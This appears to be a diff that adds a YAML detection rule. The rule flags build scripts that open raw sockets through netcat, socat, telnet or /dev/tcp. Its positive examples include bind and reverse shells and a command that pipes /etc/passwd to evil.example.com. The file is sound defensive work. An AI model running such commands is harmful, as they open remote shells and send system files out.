@@ -1,0 +1,32 @@
+name: socket
+version: "0.1.0"
+language: shell
+attck:
+  - T1095
+  - T1041
+message: >-
+  Opening a socket from a build script moves data to or from a remote host
+  without an HTTP client, which is both a way to fetch a payload and a way to
+  send one out. A shell redirection to /dev/tcp does it with no external
+  program at all.
+regex: '(?<=^|[^[:alnum:]_-])(nc|ncat|netcat|socat|telnet)(?=[[:space:]])|/dev/(tcp|udp)/'
+positive_examples:
+  - |
+    nc -l -p 4444 -e /bin/sh
+  - |
+    cat /etc/passwd | nc evil.example.com 4444
+  - |
+    socat TCP:evil.example.com:4444 EXEC:/bin/sh
+  - |
+    exec 3<>/dev/tcp/evil.example.com/4444
+  - |
+    telnet evil.example.com 4444
+negative_examples:
+  - |
+    PKG_LIBS=-lncurses
+  - |
+    nc=1
+  - |
+    func=ncalls
+  - |
+    SRC=encoder.c
